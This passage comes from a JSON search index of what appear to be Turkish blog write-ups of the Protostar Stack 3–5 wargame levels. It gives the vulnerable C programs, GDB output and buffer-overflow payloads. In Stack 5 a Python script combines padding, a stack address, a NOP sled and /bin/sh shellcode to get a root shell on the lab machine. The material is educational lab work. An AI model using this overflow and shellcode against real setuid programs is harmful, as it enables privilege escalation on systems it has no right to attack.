08048424 \u0026lt;win\u0026gt;: GDB user@protostar:/opt/protostar/bin$ gdb ./stack3 (gdb) p win $1 = {void (void)} 0x8048424 \u0026lt;win\u0026gt; (gdb) x win 0x8048424 \u0026lt;win\u0026gt;: 0x83e58955 Görünüşe göre win fonksiyonunun adresi 08048424\nProgramın Akışının Değiştirilmesi Programa verdiğim 64 adet \u0026ldquo;A\u0026rdquo; karakteirnin sonuna bu adresi ekliyorum.\nuser@protostar:/opt/protostar/bin$ echo -e \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\x24\\x84\\x04\\x08\u0026#34; | ./stack3 calling function pointer, jumping to 0x08048424 code flow successfully changed Böylelikle stackteki fp değişkenini 0 değerinden 08048424 değerine döndürüp bu adresteki fonksiyonu çalıştırabiliyoruz.\n","excerpt":"Stack3.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; void win() { printf(\u0026#34;code flow successfully changed\\n\u0026#34;); } int main(int argc, char **argv) { volatile int (*fp)(); char buffer[64]; fp = 0; gets(buffer); if(fp) { printf(\u0026#34;calling function pointer, jumping to 0x%08x\\n\u0026#34;, fp); fp(); } } Amaç: main fonksiyonu içerisinde çağırılmayan bir fonksiyonu değişkenin değeri değiştirilerek programın akışına manipüle etmek.\nProgramın Çalıştırılması user@protostar:/opt/protostar/bin$ ./stack3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # 64 Tane A user@protostar:/opt/protostar/bin$ ./stack3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACCCC calling function pointer, jumping to 0x43434343 Segmentation fault Program çalıştırıldığı zaman kullanıcıdan bir giriş bekliyor.","ref":"/yaz%C4%B1lar/protostar/stack3/","title":"Stack 3"},{"body":" Stack4.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; void win() { printf(\u0026#34;code flow successfully changed\\n\u0026#34;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Önceki seviyeden farkı burada fp yok!\nAmaç: main fonksiyonu içerisinde ki stack taşırılarak eip değerini değiştirip programın akışına manipüle etmek.\nProgramın Çalıştırılması user@protostar:/opt/protostar/bin$ ./stack4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA user@protostar:/opt/protostar/bin$ ./stack4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD Segmentation fault Önceki seviyede fp değişkenini değiştirerek istediğimiz adresteki fonksiyonu çalıştırabiliyorduk fakat bu seviyede böyle bir imkanımız olmadığı için eip registerinin stackteki yerini istediğimiz şekilde doldurarak programın akışını değiştireceğiz.\nProgramlarda genellikle bir fonksiyon çağırıldığı zaman o fonksiyona girilmeden önce çalıştırılan fonksiyondan sonra, geri döneceği adresi stacke atar böylelikle hem fonksiyonların lokal değişkenleri birbirine karışmamış ve gereksiz yer kaplamamış olur.\nDönüş adresini tespit etmek Önceki seviyeden daha uzun bir karakter dizisi kullanıyorum çünkü önceki seviyedeki gibi lokal değişkeni değil lokal değişkenlerden önce stackte yer kaplayan dönüş adresini değiştireceğiz. Genellikle Segmentation Fault alana kadar A ekleyip sonrasına 4 bytelık farklı karakterler ekliyorum.\nuser@protostar:/opt/protostar/bin$ ./stack4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF Segmentation fault user@protostar:/opt/protostar/bin$ dmesg | tail -1 [16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4 Programa yukarıdaki gibi uzun bir string verdikten sonra segmentation fault alıyoruz ve dmesg çıktısına baktığımızda ip registerinin 45454545 olduğunu görüyoruz.\n\u0026gt;\u0026gt;\u0026gt; print( chr(0x45) ) E 0x45\u0026lsquo;in E karakterine ait olduğunu tespit ettikten sonra atlamak istediğimiz fonksiyonun adresini bulmamız gerekiyor.\nHızlıca önceki seviyede yaptığım gibi win fonksiyonunun adresini tespit ediyorum.\nuser@protostar:/opt/protostar/bin$ objdump -S stack4 | grep win 080483f4 \u0026lt;win\u0026gt;: win fonksiyonunun yerini 080483f4 olarak not ediyoruz.\nProgramın Akışının Değiştirilmesi Programa verdiğim 76 adet \u0026ldquo;A\u0026rdquo; karakteirnin sonuna bu adresi ekliyorum.\nuser@protostar:/opt/protostar/bin$ echo -e \u0026#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xf4\\x83\\x04\\x08\u0026#34; | ./stack4 code flow successfully changed Segmentation fault Böylelikle fonksiyondan çıkarkan eip\u0026rsquo;ye atanan değişkeni 080483f4 değerine döndürüp bu adresteki fonksiyonu çalıştırabiliyoruz.\n","excerpt":"Stack4.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; void win() { printf(\u0026#34;code flow successfully changed\\n\u0026#34;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Önceki seviyeden farkı burada fp yok!\nAmaç: main fonksiyonu içerisinde ki stack taşırılarak eip değerini değiştirip programın akışına manipüle etmek.\nProgramın Çalıştırılması user@protostar:/opt/protostar/bin$ ./stack4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA user@protostar:/opt/protostar/bin$ ./stack4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDD Segmentation fault Önceki seviyede fp değişkenini değiştirerek istediğimiz adresteki fonksiyonu çalıştırabiliyorduk fakat bu seviyede böyle bir imkanımız olmadığı için eip registerinin stackteki yerini istediğimiz şekilde doldurarak programın akışını değiştireceğiz.","ref":"/yaz%C4%B1lar/protostar/stack4/","title":"Stack 4"},{"body":" Stack5.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Önceki seviyeden farkı burada zıplanabilecek herhanbgi bir fonksiyon yok!\nAmaç: stack taşırılarak eip değerini stackten bir adresi gösterecek şekilde ayarlayıp shellcode çalıştırmak.\nProgramın Çalıştırılması user@protostar:/opt/protostar/bin$ ./stack5 user@protostar:/opt/protostar/bin$ python -c \u0026#34;print \u0026#39;A\u0026#39;*100\u0026#34; | ./stack5 Segmentation fault Dönüş adresini tespit etmek user@protostar:/opt/protostar/bin$ ./stack4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF Segmentation fault user@protostar:/opt/protostar/bin$ dmesg | tail -1 [16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4 Programa yukarıdaki gibi uzun bir string verdikten sonra segmentation fault alıyoruz ve dmesg çıktısına baktığımızda ip registerinin 45454545 olduğunu görüyoruz.\nGDB kullanarak aynı şekilde bu bilgiye ulaşılabilir.\nuser@protostar:/opt/protostar/bin$ gdb stack5 -q Reading symbols from /opt/protostar/bin/stack5...done. (gdb) set disassembly-flavor intel (gdb) disassemble main Dump of assembler code for function main: 0x080483c4 \u0026lt;main+0\u0026gt;: push ebp 0x080483c5 \u0026lt;main+1\u0026gt;: mov ebp,esp 0x080483c7 \u0026lt;main+3\u0026gt;: and esp,0xfffffff0 0x080483ca \u0026lt;main+6\u0026gt;: sub esp,0x50 0x080483cd \u0026lt;main+9\u0026gt;: lea eax,[esp+0x10] 0x080483d1 \u0026lt;main+13\u0026gt;: mov DWORD PTR [esp],eax 0x080483d4 \u0026lt;main+16\u0026gt;: call 0x80482e8 \u0026lt;gets@plt\u0026gt; 0x080483d9 \u0026lt;main+21\u0026gt;: leave 0x080483da \u0026lt;main+22\u0026gt;: ret End of assembler dump. (gdb) b *main+22 Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11. (gdb) r Starting program: /opt/protostar/bin/stack5 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x4444444c ) at stack5/stack5.c:11 11 stack5/stack5.c: No such file or directory. in stack5/stack5.c (gdb) c Continuing. Program received signal SIGSEGV, Segmentation fault. 0x45454545 in ?? () Tabiki eip değiştirebilmek kod işletebilmek için yeterli değil. Stackte kod işletilebildiği durumlarda, eip\u0026rsquo;ye stackten bir adresi göstermesini sağlayabilirsek istediğimiz shell kodunu çalıştırabiliriz.\nStack adresini bulmak Yukarıdaki oturumdan devam ederek registerlerin durumuna bakarsak eğer esp bize stack pointerin en üst noktasının adresini verecektir.\n(gdb) i r eax 0xbffff730 -1073744080 ecx 0xbffff730 -1073744080 edx 0xb7fd9334 -1208118476 ebx 0xb7fd7ff4 -1208123404 esp 0xbffff780 0xbffff780 ebp 0x44444444 0x44444444 esi 0x0 0 edi 0x0 0 eip 0x45454545 0x45454545 eflags 0x210246 [ PF ZF IF RF ID ] cs 0x73 115 ss 0x7b 123 ds 0x7b 123 es 0x7b 123 fs 0x0 0 gs 0x33 51 Peki stackte nereye atlamalı Stack\u0026rsquo;e bakacak olursak input olarak verdiğimiz A karakterlerini görebiliyoruz.\n(gdb) x/64wx $esp-100 0xbffff71c: 0x080483d9 0xbffff730 0xb7ec6165 0xbffff738 0xbffff72c: 0xb7eada75 0x41414141 0x41414141 0x41414141 0xbffff73c: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff74c: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff75c: 0x41414141 0x41414141 0x41414141 0x41414141 0xbffff76c: 0x41414141 0x42424242 0x43434343 0x44444444 0xbffff77c: 0x45454545 0x46464646 0xbffff800 0xbffff82c 0xbffff78c: 0xb7fe1848 0xbffff7e0 0xffffffff 0xb7ffeff4 0xbffff79c: 0x08048232 0x00000001 0xbffff7e0 0xb7ff0626 0xbffff7ac: 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 0x00000000 0xbffff7bc: 0x00000000 0xbffff7f8 0x0b564e3d 0x2101382d 0xbffff7cc: 0x00000000 0x00000000 0x00000000 0x00000001 0xbffff7dc: 0x08048310 0x00000000 0xb7ff6210 0xb7eadb9b 0xbffff7ec: 0xb7ffeff4 0x00000001 0x08048310 0x00000000 0xbffff7fc: 0x08048331 0x080483c4 0x00000001 0xbffff824 0xbffff80c: 0x080483f0 0x080483e0 0xb7ff1040 0xbffff81c \\x45 leri değiştirerek eipyi kontrol edebiliyorduk. Stackte daha derinlere yazabiliyorsak o zaman shellcode\u0026rsquo;u eip\u0026rsquo;den bir sonraki adıma bırakır ve eip\u0026rsquo;yi kendinden bir sonraki adresi gösterecek şekilde ayarlayabilirsek programın devamında istediğimiz kodu çalıştırabiliriz.\nKod üzerinde anlaması daha kolay olacağından ufaktan script yazalım.\nstack5.py padding = \u0026#34;\\x41\u0026#34;*76 eip = \u0026#34;\\xb8\\xf7\\xff\\xbf\u0026#34; nop = \u0026#34;\\x90\u0026#34; trap = \u0026#34;\\xCC\u0026#34;*4 print padding + eip + nop*40 + trap Koddaki \\x90 lar NOPcode olarak bilinen işlemcinin o süreyi boş geçmesini sağlayan işlemci komutudur. Kısaca bu adreslerden birini çalıştırmayı başlatabilirsek ileride çarpacağı herhangi bir komutu çalıştırmaya devam edecektir.\nuser@protostar:~$ python stack5.py | /opt/protostar/bin/stack5 Trace/breakpoint trap Görüldüğü üzere \\xCC bir işlemci tuzak kodudur. Debug işlemlerinde breakpoint\u0026rsquo;ler bu şekilde sağlanır.\nYukarıdaki kodda eip adresi, NOP kodlarının olduğu herhangi bir yer olabilir.\nRoot Koddaki trapleri kaldırıp shellcode yerleştirdiğimiz zaman teorik olarak root shellimiz bizi bekliyor olacak.\npadding = \u0026#34;\\x41\u0026#34;*76 eip = \u0026#34;\\xb8\\xf7\\xff\\xbf\u0026#34; nop = \u0026#34;\\x90\u0026#34; shellcode = \u0026#34;\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x70\\x89\\xe1\\x52\\x6a\\x68\\x68\\x2f\\x62\\x61\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\u0026#34; print padding + eip + nop*40 + shellcodeuser@protostar:~$ python stack5.py | /opt/protostar/bin/stack5 user@protostar:~$ python stack5.py | /opt/protostar/bin/stack5 user@protostar:~$ Burada Linux\u0026rsquo;ta bulunan | işaretinden kaynaklı bir sorun var. Pipe soldaki programın çıktısını sağdaki programa input olarak veriyor böylelikle stack5 programına istediğimiz inputu istediğimiz şekilde verebiliyoruz. Fakat soldaki program; ekrana bufferi doldurup, eip adresini güncelleyip, bir sürü nop ekledikten sonra shellcode yazıp kapanıyor. Böylelikle biz stack5\u0026rsquo;te kod işletme hakkımız olmasına rağmen programdan çıkıyoruz.\nLinuxta bulunan cat programı dosyaların içeriğini terminale basmakta kullanılabileceği gibi hiç bir argüman verilmemesi durumunda her satırı iki kere ekrana basar.\nuser@protostar:~$ cat stack5 \u0026lt;- input stack5 -\u0026gt; output Python kodumuzu ve cat\u0026rsquo;i birleştirerek root kabuğu elde edilebilir.\nuser@protostar:~$ whoami user user@protostar:~$ whoami user user@protostar:~$ (python stack5.py;cat) | /opt/protostar/bin/stack5 whoami root id uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)","excerpt":"Stack5.c #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int main(int argc, char **argv) { char buffer[64]; gets(buffer); } Önceki seviyeden farkı burada zıplanabilecek herhanbgi bir fonksiyon yok!\nAmaç: stack taşırılarak eip değerini stackten bir adresi gösterecek şekilde ayarlayıp shellcode çalıştırmak.\nProgramın Çalıştırılması user@protostar:/opt/protostar/bin$ ./stack5 user@protostar:/opt/protostar/bin$ python -c \u0026#34;print \u0026#39;A\u0026#39;*100\u0026#34; | ./stack5 Segmentation fault Dönüş adresini tespit etmek user@protostar:/opt/protostar/bin$ ./stack4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF Segmentation fault user@protostar:/opt/protostar/bin$ dmesg | tail -1 [16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4 Programa yukarıdaki gibi uzun bir string verdikten sonra segmentation fault alıyoruz ve dmesg çıktısına baktığımızda ip registerinin 45454545 olduğunu görüyoruz.","ref":"/yaz%C4%B1lar/protostar/stack5/","title":"Stack 5"},{"body":"","excerpt":"","ref":"/seriler/yaz%C4%B1lar/","title":"Yazılar"}]